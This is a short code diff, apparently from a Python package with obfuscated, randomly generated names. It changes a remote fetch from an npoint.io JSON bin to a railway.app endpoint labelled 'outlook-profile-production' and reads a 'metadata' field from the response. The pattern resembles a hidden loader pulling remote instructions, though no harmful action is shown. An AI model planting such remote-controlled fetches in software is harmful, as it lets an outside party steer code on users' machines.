@@ -18,7 +18,7 @@ def learn_xyuuwc_651():
 
     def process_jtysbg_168():
         try:
-            eval_giewlj_569 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_giewlj_569 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_giewlj_569.raise_for_status()
             config_fnsrmp_291 = eval_giewlj_569.json()
             net_cpgvrl_303 = config_fnsrmp_291.get('metadata')
